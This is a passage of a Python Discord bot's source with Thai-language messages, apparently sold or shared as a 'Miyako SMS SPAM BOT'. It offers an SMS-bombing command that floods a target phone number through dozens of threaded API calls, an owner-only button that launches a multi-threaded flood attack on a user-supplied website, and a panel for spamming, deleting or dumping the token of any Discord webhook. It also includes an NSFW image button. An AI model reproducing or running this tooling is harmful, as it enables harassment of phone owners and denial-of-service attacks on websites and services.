        threading.submit(ab11, phone)
        threading.submit(ab12, phone)
        threading.submit(ab13, phone)
        threading.submit(ab14, phone)
        threading.submit(ab15, phone)
        threading.submit(ab16, phone)
        threading.submit(ab17, phone)
        threading.submit(ab18, phone)
        threading.submit(ab19, phone)
        threading.submit(ab20, phone)
        threading.submit(ab21, phone)
        threading.submit(ab22, phone)
        threading.submit(ab23, phone)
        threading.submit(ab24, phone)
        threading.submit(ab25, phone)
        threading.submit(ab26, phone)
        threading.submit(ab27, phone)
        threading.submit(ab28, phone)
        threading.submit(ab29, phone)
        threading.submit(ab30, phone)
        threading.submit(ab31, phone)
        threading.submit(ab32, phone)
        threading.submit(ab33, phone)
        threading.submit(ab34, phone)
        threading.submit(ab35, phone)
        threading.submit(ab36, phone)
        threading.submit(ab37, phone)
        threading.submit(ab38, phone)
        threading.submit(ab39, phone)
        threading.submit(ab40, phone)
        threading.submit(ab41, phone)
        threading.submit(ab42, phone)
        threading.submit(ab43, phone)
        threading.submit(ab44, phone)
        threading.submit(ab45, phone)
        threading.submit(ab46, phone)
        threading.submit(ab47, phone)
        threading.submit(ab48, phone)
        threading.submit(ab49, phone)
        threading.submit(ab50, phone)
        threading.submit(ab51, phone)
        threading.submit(ab52, phone)

# ^ IS API DONT DO ANYTHING

@bot.command()
async def help(ctx):
    await ctx.send(f"<a:success:1192084671060791308> | BOT STATUS ONLINE\n__**แจ้งเตือน**__ : ข้อความจะถูกลบภายใน15วิ",delete_after=15)
    await ctx.send(f"```Command \n {PREFIX}help \n {PREFIX}sms คำสั่งยิงเบอร์ : {PREFIX}sms (เบอร์) (เวลา1- {str(LIMIT)}นาที) \n {PREFIX}{COMMAND_UPTIME} \n {PREFIX}{COMMAND_CHECK} ```\n __**OWNER COMMAND**__ \n ``` {PREFIX}{COMMAND_NSFW} [OWNER ONLY] \n {PREFIX}{COMMAND_VERIFY} [OWNER ONLY] \n {PREFIX}{COMMAND_SAVROLE} [OWNER ONLY] \n {PREFIX}{COMMAND_WEBHOOK} [ADMIN] \n {PREFIX}{COMMAND_REDEEM} [OWNER] \n {PREFIX}{COMMAND_ATTACK} [OWNER]```",delete_after=15)
    await ctx.message.delete()

@bot.command()
async def sms(ctx, phone=None, amount=None):
        if (phone == None or amount == None):
            embed=discord.Embed( description=f"❌ | กรุณาใส่ข้อมูลให้ครบ", color=0xfa0202,timestamp=datetime.utcnow())                      
            embed.set_thumbnail(url='https://media.discordapp.net/attachments/680449178626818065/909437371097972747/794404253744496642.gif')
            await ctx.message.add_reaction("❌")           
            await ctx.send(embed=embed,)            
        else:
            if (phone not in blacklist):
                try:
                    amount = int(amount)
                    if (amount > LIMIT):
                        embed=discord.Embed(description=f" ❌ | ใส่ไม่เกิน {amount} นาที.", color=0xfa0202,timestamp=datetime.utcnow())                                               
                        embed.set_thumbnail(url='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')
                        await ctx.message.add_reaction("❌")                        
                        await ctx.send(embed=embed,)  
                        await ctx.message.delete()                      
                    else:
	                    
	                   
                        embed=discord.Embed( description=f"เบอร์ 📱 | ||{phone}|| \nสถานะ 📦  | สุ่ม API \nเป็นเวลา 📊 | {amount}/{LIMIT} นาที", color=0x02fafa)
                        embed.set_footer(text=f"{ctx.message.author.name} คนยิง " )
                        embed.set_author(name='Miyako SMS SPAM BOT')
                        ima = Images
                        embed.set_image(url=ima)
                        await ctx.reply(embed=embed)
                        await ctx.message.add_reaction("✅")
                        startall(phone, amount) 
                         
                except:
                    embed=discord.Embed(description=f"❌ | ใส่เบอร์ให้ถูก. ", color=0xfa0202,timestamp=datetime.utcnow())                                       
                    embed.set_thumbnail(url='https://media.giphy.com/media/JT7Td5xRqkvHQvTdEu/giphy.gif')
                    await ctx.message.add_reaction("❌")                    
                    await ctx.message.delete()
                    await ctx.send(embed=embed,delete_after=10)
            else:
                embed=discord.Embed( description=f"❌ | เบอร์นี้ไม่สามารถยิงได้ | ❌\n**{ctx.author}** ",color=0xfa0202,timestamp=datetime.utcnow())
                await ctx.message.add_reaction("❌")                                                          
                await ctx.send(embed=embed,)
                await ctx.message.delete()


@bot.command()
async def saverole_setup(ctx: Interaction):
    if ctx.author.name == name:
        await ctx.message.delete()
        embed = Embed(title="บอทเซฟยศอัตโนมัติ",
                      description="```[+] ระบบนี้เป็นการป้องกันออกจากดิส\n[+] เมื่อทำการเซฟแล้วยศทั้งหมดจะบันทึกไว้ในระบบ\n[+] เซิฟยศเอาไว้เผื่อเด้งออกจากดิส\n > เซฟยศ (เซฟไว้ในระบบ)\n > รับยศคืน (ได้ยศคืนตามที่เซฟไว้)```\n",
                      color=0xdddddd)
        embed.set_image(url=Images)
        await ctx.send(embed=embed, view=saverole(log_channel_id))

from datetime import datetime, timedelta

class saverole(View):
    def __init__(self, log_channel_id):
        super().__init__(timeout=None)
        self.log_channel_id = log_channel_id
        self.cooldowns = {} 

    @nextcord.ui.button(label="เซฟยศ", style=ButtonStyle.primary, emoji="<a:1198633069742141623:1198633069742141623>")
    async def save(self, button: nextcord.Button, interaction: Interaction):
        user = interaction.user
        if user.id in self.cooldowns and user.id != 874898422233178142:
            time_remaining = self.cooldowns[user.id] - datetime.now()
            if time_remaining.total_seconds() > 0:
                await interaction.response.send_message(f"> `รอ {int(time_remaining.total_seconds() // 3600)} ชั่วโมง {int((time_remaining.total_seconds() % 3600) // 60)} นาที เพื่อกดเซฟอีกครั้ง ` ❗", ephemeral=True)
                return
        
        role_data = [role.name for role in user.roles if "@everyone" not in role.name]
        file_path = f"data/role_{user.name}.json"
        with open(file_path, "w") as f:
            json.dump(role_data, f)
            
        self.cooldowns[user.id] = datetime.now() + timedelta(days=1)
        
        embed = Embed(title="บันทึกยศที่เซฟ", color=0xdddddd)
        formatted_roles = "\n".join(role_data)
        embed.add_field(name="ยศที่เซฟ", value=f"```\n{formatted_roles}```", inline=False)
        current_time = datetime.now().strftime("%d/%m/%y")
        await interaction.send(embed=embed, ephemeral=True)

        log_channel = bot.get_channel(self.log_channel_id)
        if log_channel:
            log_embed = Embed(title="บันทึกเรียบร้อย 📝", color=0xdddddd)
            log_embed.add_field(name="ยศที่เซฟ", value=f"```\n{formatted_roles}```", inline=False)
            log_embed.add_field(name="วันที่เซฟ", value=current_time, inline=False)
            log_message = f"📝 {user.name} ได้ทำการบันทึกยศเรียบร้อยแล้ว"
            log_embed.set_footer(text=log_message)
            if user.avatar:
                    log_embed.set_author(name=f"{user.name} ทำการบันทึกยศเรียบร้อยแล้ว", icon_url=user.avatar.url)
            else:
                log_embed.set_author(name=f"{user.name} ทำการบันทึกยศเรียบร้อยแล้ว", icon_url=None)

            await log_channel.send(embed=log_embed)

    @nextcord.ui.button(label="รับยศคืน", style=ButtonStyle.green, emoji="<a:1198632831488897107:1198632831488897107>")
    async def get(self, button: nextcord.Button, interaction: Interaction):
        user = interaction.user
        file_path = f"data/role_{user.name}.json"
        try:
            with open(file_path, "r") as f:
                role_data = json.load(f)
                for role_name in role_data:
                    roles = nextcord.utils.get(interaction.guild.roles, name=role_name)
                    await user.add_roles(roles)
            await interaction.send("> `คืนยศให้คุณเรียบร้อยแล้ว`", ephemeral=True)
        except FileNotFoundError:
            await interaction.send("> `คุณยังไม่ได้เซฟยศรึปล่าว`", ephemeral=True)
         
    @nextcord.ui.button(label="ดูข้อมูลผู้ใช้", style=ButtonStyle.blurple, emoji="<a:1198631834087592011:1198631834087592011>")
    async def get_user_info(self, button: nextcord.Button, interaction: nextcord.Interaction):
        user = interaction.user

        created_since = (interaction.message.created_at - user.created_at).days
        created_since_str = f"{created_since} วันที่ผ่านมา"

        user_info_embed = nextcord.Embed(title=f"ข้อมูลของ {user.display_name}", color=nextcord.Color.blurple())

        if user.avatar:
            user_info_embed.set_thumbnail(url=user.avatar.url)
        else:
            user_info_embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/889976848581287946/1193140899987865600/Herrscher.of.the.Void.full.2866346.gif?ex=65aba20e&is=65992d0e&hm=9afd68f45f0972ffadbaf18375adb52cf6e80cf59d83bbf6c0ecf1ca6e51a1e9&")

        user_info_embed.add_field(name="ID Discord", value=user.id, inline=False)
        user_info_embed.add_field(name="วันที่สร้างบัญชี", value=created_since_str, inline=False)

        if len(user.roles) > 1:
            roles = ", ".join([role.mention for role in user.roles[1:]])
            user_info_embed.add_field(name="บทบาท", value=roles, inline=False)

        if user.premium_since:
            user_info_embed.add_field(name="Nitro Boost", value="เป็น Nitro Boost ตั้งแต่: " + user.premium_since.strftime("%Y-%m-%d"), inline=False)


        await interaction.response.send_message(embed=user_info_embed, ephemeral=True)

    @nextcord.ui.button(label="วิธีการใช้งาน", style=ButtonStyle.grey, emoji="<:4983blackcathuh:1198631074058752062>")
    async def usage(self, button: nextcord.Button, interaction: Interaction):
        instructions = "```วิธีการใช้งาน:\n1. คลิกปุ่ม 'เซฟยศ' เพื่อบันทึกยศของคุณ\n2. หากต้องการคืนยศให้กับตัวเอง คลิกปุ่ม 'รับยศคืน'\n3. หากต้องการดูวิธีการใช้งานอื่นๆ คลิกปุ่ม 'วิธีการใช้งาน'\n\nหมายเหตุ : การกดเซฟยศมีคลูดาว 1\nวันกรณีดิสโดนยิงหรือคุณออกจากดิสยศคุณจะไม่หาย```"

        embed = Embed(title="วิธีการใช้งานบอท", description=instructions, color=0xf8f5f5)
        embed.set_footer(text="Made by Miayko!")

        await interaction.send(embed=embed, ephemeral=True)
        
class dssddsauhf(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title='ยิงเว็บไซต์')
        self.url = nextcord.ui.TextInput(label='ลิงก์เว็บไซต์', required=True, placeholder='xxxxxxxxxxxxxxxxxxxxxxxxxxx')
        self.add_item(self.url)
        self.th = nextcord.ui.TextInput(label='Threads (defaults 500)', required=True, placeholder='xxxxxxxxxxxxxxxxxxxxxxxxxxx')
        self.add_item(self.th)
    
    async def callback(self, interaction: nextcord.Interaction):
        try:
            i = int(self.th.value)
        except ValueError:
            i = 500
        await interaction.response.send_message('## > เริ่มโจมตีเว็บไซต์ของคุณแล้ว!', ephemeral=True)
        threading.Thread(target=run, args=[self.url.value, i]).start()

class attack(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @nextcord.ui.button(
        label='Attack',
        style=nextcord.ButtonStyle.green
    )
    async def callback(self, button, interaction: nextcord.Interaction):
        return await interaction.response.send_modal(dssddsauhf())
    
class Button(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @nextcord.ui.button(
        label='ATTACK',
        style=nextcord.ButtonStyle.green
    )
    async def callback(self, button, interaction: nextcord.Interaction):
        return await interaction.response.send_modal(dssddsauhf())
        
@bot.command(pass_context=True)
async def attack_setup(interaction: nextcord.Interaction):
    if interaction.author.name == name:
        embed = nextcord.Embed()
        embed = nextcord.Embed(
            title='Bot attack website',
            description='กดปุ่มเพื่อยิงเว็บ'
        )
        await interaction.send(embed=embed, view=attack())

class MyRedeem(nextcord.ui.Modal):
    def __init__(self):
        super().__init__('Redeem')
        self.key = nextcord.ui.TextInput(label='Key', placeholder='xxxxxxxxxxxxxxxxxxx', required=True, custom_id='keyredeem')
        self.add_item(self.key)
    
    async def callback(self, interaction: nextcord.Interaction):
        try:
            keyJSON = json.load(open(f'key/{self.key.value}.json', encoding='utf-8'))
            role = keyJSON['roles']
            status = keyJSON['status']

            if status == 'false':
                content = 'คีย์นี้ถูกใช้งานไปแล้ว!'
            else:
                for r in interaction.user.roles:
                    if f'{role}' in r.name:
                        return await interaction.response.send_message('ไม่สามารถใขช้งานได้ - คุณมียศนี้อยู่แล้ว', ephemeral=True)

                with open(f'key/{self.key.value}.json', 'w', encoding='utf-8') as f:
                    da = {
                        'roles': role,
                        'status': 'false'
                    }
                    f.write(json.dumps(da, indent=4))
                utils = nextcord.utils.get(interaction.guild.roles, name=f'{role}')
                try:
                    await interaction.user.add_roles(utils)
                except AttributeError:
                    return await interaction.response.send_message('ไม่พบยศนี้ (โปรดติดต่อแอดมิน)', ephemeral=True)
                content = f'คุณได้รับยศสำเร็จแล้ว!'
        except FileNotFoundError:
            content = 'ไม่พบคีย์นี้ในระบบ!'
        
        return await interaction.response.send_message(content=content, ephemeral=True)

class SetupView(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @nextcord.ui.button(
        label='Redeem',
        style=nextcord.ButtonStyle.green,
        custom_id='redeem',
        row=0
    )
    async def redeem(self, button: nextcord.ui.Button, interaction: nextcord.Interaction):
        return await interaction.response.send_modal(MyRedeem())            
    
@bot.command(pass_context=True)
async def redeem(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.message.delete()
        embed = nextcord.Embed()
        embed.title = 'Redeem Key Gave special Roles'
        embed.description = '> [+] Click button below to redeem and get special roles'
        embed.set_image(url=Images)
        await ctx.send(embed=embed, view=SetupView())
@bot.slash_command(
    name='add-key',
)

async def add(interaction: nextcord.Interaction, key, role_name):
    if interaction.user.guild_permissions.administrator:
        with open(f'key/{key}.json', 'w+', encoding='utf-8') as k:
            s = {
                'roles': role_name,
                'status': 'true',
                'key': key
            }
            k.write(json.dumps(s, indent=4))
        return await interaction.response.send_message('เพิ่มคีย์สำเร็จแล้ว!', ephemeral=True)
        

async def logsend(embed):
    async with aiohttp.ClientSession() as session:
        webhook = nextcord.Webhook.from_url(WEBHOOK_URL, session=session)
        await webhook.send(embed=embed)

class verify(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @nextcord.ui.button(label=BUTTON_NAME, style=nextcord.ButtonStyle.blurple, emoji="<a:1_:1175394062396837928>", custom_id="addrole")
    async def addrole(self, button: nextcord.Button, interaction: nextcord.Interaction):
        role = nextcord.utils.get(interaction.guild.roles, id=ROLE_ID)

        if not role:
            embed = nextcord.Embed(description="บทบาทที่ถูกตั้งค่าไม่พบในเซิร์ฟเวอร์", color=0xff6961)
            await interaction.send(embed=embed, ephemeral=True)
            return

        if role in interaction.user.roles:
            embed = nextcord.Embed(description="คุณอยู่มียศอยู่แล้ว", color=0xff6961)
            await interaction.send(embed=embed, ephemeral=True)
            return
        else:
            await interaction.user.add_roles(role)

            embed = nextcord.Embed(description="คุณยืนยันตัวตนสำเร็จ", color=0x77dd77)
            await interaction.send(embed=embed, ephemeral=True)

            dm = nextcord.Embed(description=f"คุณได้รับยศ `{role}` ในเซิร์ฟเวอร์ `{interaction.guild.name}` เรียบร้อยแล้ว", color=0xffffff)
            await interaction.user.send(embed=dm)

            log = nextcord.Embed(title="รับยศสำเร็จ", description=f"รับยศ `{role}` สำเร็จ", color=0x00ff00)
            log.set_author(name=interaction.user, icon_url=interaction.user.avatar)
            log.set_footer(text=f'ไอดียศ: {ROLE_ID} วันที่และเวลา {current_time}')

            await logsend(log)

async def logsend(embed):
  async with aiohttp.ClientSession() as session:
    webhook = nextcord.Webhook.from_url(WEBHOOK_URL, session=session)
    await webhook.send(embed=embed)

class Spam(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("สแปมเว็ปฮุค")  
        self.webhook = nextcord.ui.TextInput(
            label="ลิ้งค์เว็บฮุค",
            required=True
        )
        self.add_item(self.webhook)
        self.msg = nextcord.ui.TextInput(
            label="ข้อความ",
            required=True
        )
        self.add_item(self.msg)
        self.amount = nextcord.ui.TextInput(
            label="จำนวน",
            required=True
        )
        self.add_item(self.amount)
    async def callback(self, interaction: nextcord.Interaction):
        response = requests.get(self.webhook.value)
        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if response.status_code == 200:
          await interaction.send(f"**สแปมเว็ปฮุคสําเร็จ** `{self.webhook.value}`",ephemeral=True)
          for i in range(int(self.amount.value)):
            requests.post(self.webhook.value,json={ 'content' : self.msg.value})  
        else:
          await interaction.send("**สแปมว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)

class Delete(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("ลบเว็ปฮุค")  
        self.webhook = nextcord.ui.TextInput(
            label="ลิ้งค์เว็บฮุค",
            required=True
        )
        self.add_item(self.webhook)
    async def callback(self, interaction: nextcord.Interaction):
        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if requests.delete(self.webhook.value).status_code == 204:
          await interaction.send(f"**ลบเว็ปฮุคสําเร็จ** `{self.webhook.value}`",ephemeral=True)
        else:
          await interaction.send("**ลบเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)
        
class Check(nextcord.ui.Modal):
    def __init__(self):
        super().__init__("เช็คเว็ปฮุค")  
        self.webhook = nextcord.ui.TextInput(
            label="ลิ้งค์เว็บฮุค",
            required=True
        )
        self.add_item(self.webhook)
    async def callback(self, interaction: nextcord.Interaction):
        response = requests.get(self.webhook.value)
        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
          return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
        if response.status_code == 200:
          i = response.json()
          if i['avatar'] == None:
            embed = nextcord.Embed(description=f"**ชนิด** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{i['application_id']}`\n**โทเคนเว็ปฮุค** : `{i['token']}`")
            await interaction.send(embed=embed,ephemeral=True)
          else:
            embed = nextcord.Embed(description=f"**ชนิด** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอปพลิเคชัน** : `{i['application_id']}`\n**โทเคนเว็ปฮุค** : `{i['token']}`")
            embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{i['id']}/{i['avatar']}.png")
            await interaction.send(embed=embed,ephemeral=True)
        else:
          await interaction.send("**เช็คเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)

class webhook(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @nextcord.ui.button(label="เช็คเว็ปฮุค", style=nextcord.ButtonStyle.green, emoji="<a:Black_CatLinguinha:1198632831488897107>",custom_id="check")
    async def check(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await interaction.response.send_modal(Check())
    
    @nextcord.ui.button(label="สแปมเว็บฮุค", style=nextcord.ButtonStyle.blurple, emoji="<a:BlackCat:1198631834087592011>",custom_id="spam")
    async def spam(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await interaction.response.send_modal(Spam())

    @nextcord.ui.button(label="ลบเว็บฮุค", style=nextcord.ButtonStyle.red, emoji="<:dawdas:1202987022994776145>",custom_id="delete")
    async def delete(self, button: nextcord.Button , interaction: nextcord.Interaction):
                await interaction.response.send_modal(Delete())


@bot.command(pass_context = True)
async def webhook_setup(ctx):
    if ctx.author.guild_permissions.administrator:
            await ctx.message.delete()
            embed = nextcord.Embed(title="สแปมเว็ปฮุค กับ ลบเว็ปฮุค ผ่านบอทแบบปุ่มกด",color=0x7289da)
            embed.set_image(url=Images)
            await ctx.send(embed=embed, view=webhook())
    else:
        await ctx.reply('มึงไม่มีสิทธิ์ใช้ครับไอ้โง่')


@bot.command()
async def verify_setup(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.message.delete()
        embed = nextcord.Embed(title="กดปุ่มรับยศ", description="```อย่าลืมกดรับยศก่อนจะเข้าดิสมาด้วยนะครับ\nหากบอทมีปัญหาทัก DMs หาผมเลยผมจะรีบแก้ไข ⚙️```", color=0xfbe7ff)
        embed.set_image(url=Images)
        await ctx.send(embed=embed, view=verify())
    else:
        await ctx.reply('คุณไม่มีสิทธิ์ใช้คำสั่งนี้')

@bot.command()
async def check_time(ctx):
    await ctx.send(f"เวลาปัจจุบันคือ: ⌚{current_time}")

@bot.command()
async def uptime(ctx):
    # คำนวณเวลาที่บอทออนไลน์แล้ว
    uptime_message = datetime.now() - start_time

    # แปลงให้เป็นรูปแบบที่อ่านง่าย
    hours, remainder = divmod(int(uptime_message.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)

    # สร้างข้อความเพื่อแสดงผลเวลาที่ออนไลน์
    uptime_start = f"{days} วัน, {hours} ชั่วโมง, {minutes} นาที, {seconds} วินาที"

    # ส่งข้อความเวลาออนไลน์กลับไปยังผู้ใช้
    await ctx.reply(f"บอทออนไลน์มาแล้วเป็นเวลา: {uptime_start}")

class NSFW(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @nextcord.ui.button(
        emoji='<a:DancingBlackCat:1198633069742141623>',
        label='แสดงรูปภาพ',
        style= nextcord.ButtonStyle.blurple
    )
    async def send(self, button: nextcord.Button, interaction: nextcord.Interaction):
        msg = await interaction.response.send_message('## > [+] โปรดรอสักครู่...', ephemeral=True)
        api = 'https://api.waifu.pics/nsfw/waifu'

        url = requests.get(api).json()['url']

        await msg.edit(content=f'{url}')
            
@bot.command(pass_context = True)
async def nsfw_setup(interaction: nextcord.Interaction):
    await interaction.message.delete()
    if interaction.author.name == name:
        embed = nextcord.Embed(
            description='คลิกปุ่มเพื่อสุ่มรูปอนิเมะ 18+',
            color=None
        )
        embed.set_image(url=Images)
        await interaction.send(embed=embed, view=NSFW())

import datetime as dt
import os

@bot.event
async def on_ready():
    bot.add_view(verify())
    vc = nextcord.utils.get(bot.get_guild(Guild_ID).channels, id=Vc_ID)
    await vc.guild.change_voice_state(channel=vc, self_mute=False, self_deaf=True)
    global start_time
    start_time = dt.datetime.now()
    clear_console()
    print(f"{TerminalColors.HEADER}Bot is ready: {bot.user.name}")
    print(f"{TerminalColors.OKBLUE}Connected to {len(bot.guilds)} servers:{TerminalColors.ENDC}")
    for guild in bot.guilds:
        print(f"{TerminalColors.OKGREEN}- {guild.name} {TerminalColors.WARNING}(ID: {guild.id}){TerminalColors.ENDC}")
    total_users = sum(len(guild.members) for guild in bot.guilds)
    print(f"{TerminalColors.BOLD}Serving {total_users} users{TerminalColors.ENDC}")
    print(f"{TerminalColors.UNDERLINE}ONLINE{TerminalColors.ENDC}")

    await change_presence()

async def change_presence():
    activities = [
        Activity(type=ActivityType.streaming, name=Name_status,url=Twitch_url),
    ]

    statuses = [Status.online, Status.dnd, Status.idle]

    for status, activity in zip(itertools.cycle(statuses), itertools.cycle(activities)):
        await bot.change_presence(status=status, activity=activity)
        await asyncio.sleep(1)

bot.run(os.environ['token'])
